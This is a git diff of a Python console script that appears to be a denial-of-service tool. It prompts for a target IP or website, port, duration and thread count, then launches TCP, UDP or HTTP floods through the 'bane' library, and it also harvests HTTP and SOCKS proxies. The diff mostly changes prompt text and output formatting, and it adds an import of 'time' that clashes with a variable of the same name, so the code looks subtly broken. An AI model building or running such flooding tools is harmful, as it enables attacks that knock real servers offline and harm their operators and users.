@@ -13,6 +13,7 @@ import pyfiglet
 from colorama import Fore, Style
 import sys
 import os
+import time
 
 r = Fore.RED
 b = Fore.BLUE
@@ -58,13 +59,13 @@ def banner():
 banner()
 
 while True:
-	console = input(Fore.CYAN + "d4rksh4d0w@console ~ : ")
+	console = input(Fore.CYAN  + "[d4rksh4d0w@console~]$ : ")
 	print(reset)
 	if console == "help":
 		print(b + "ddos:" + r , "Type ddos command to show ddos help menu")
 		print(b + "proxies:" + r , "Type proxies command to show proxy gathering help menu")
 		print(b + "exit:" + r , "Type exit command to Exit the console ")
-		print(b + "clear" + r, "Type clear command to clear the screen")
+		print(b + "clear:" + r, "Type clear command to clear the screen")
 
 	elif console == "exit":
 		print(b + "Exiting the Console Goodbye ...")
@@ -93,9 +94,10 @@ while True:
 		print(reset)
 		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
 		bane.tcp_flood(target, p=port, min_size=10, max_size=20, interval=0.001, threads=th, timeout=5, duration=time, logs=True)
+			
 
 	elif console == "udpflood":
-		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :"))
+		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : "))
 		po = int(input(Fore.CYAN + "[+] Enter Port Number : "))
 		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
 		print(reset)
@@ -103,7 +105,7 @@ while True:
 		bane.udp_flood(ip, p=po, min_size=10, max_size=20, interval=0.001, duration=th,  logs=True)
 
 	elif console == "httpflood":
-		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :"))
+		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : "))
 		po = int(input(Fore.CYAN + "[+] Enter Port Number : " ))
 		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
 		threading = int(input(Fore.CYAN + "[+] Enter number of Threads : " ))
@@ -149,24 +151,32 @@ while True:
 
 
 	elif console == "http_proxy":
-		number = input(r + "[+] How many http proxy you want : " )
-		print(r + "[+] Finding Http proxies ...")
+		number = input(b + "[+] How many http proxy you want : " )
+		print(b + "[+] Finding {} Http proxies Please wait ..." .format(number))
 		print(reset)
 		a = bane.masshttp(int(number))
-		print(a)
-	
+		for x in a:
+			print(m + "[+] http Proxy Found  : "  + r + x, sep="\n")
+			time.sleep(1)
+
 	elif console == "socks4_proxy":
-		no = input(r + "[+] How many socks4 proxy you want : " )
-		print(r + "[+] Finding socks4 proxies ..")
+		no = input(b + "[+] How many socks4 proxy you want : " )
+		print(b + "[+] Finding {} socks4 proxies Please wait ..." .format(no))
 		print(reset)
 		proxy = bane.massocks4(int(no))
-		print(proxy)
+		for x in proxy:
+			print(m + "[+] socks4 Proxy Found  : " +  r  + x, sep="\n")
+			time.sleep(1)
+
 	elif console == "socks5_proxy":
-		no = input(r + "[+] How many socks5 proxy you want : " )
-		print(r + "[+] Finding socks5 proxies ..")	
+		no = input(b + "[+] How many socks5 proxy you want : " )
+		print(b + "[+] Finding {} socks5 proxies Please wait ..." .format(no))	
 		print(reset)
 		proxy = bane.massocks5(int(no))
-		print(proxy)
+		for x in proxy:
+			print(m + "[+] socks5 Proxy Found : " + r + x, sep="\n")
+			time.sleep(1)
+
 
 	elif console == "":
 		pass	
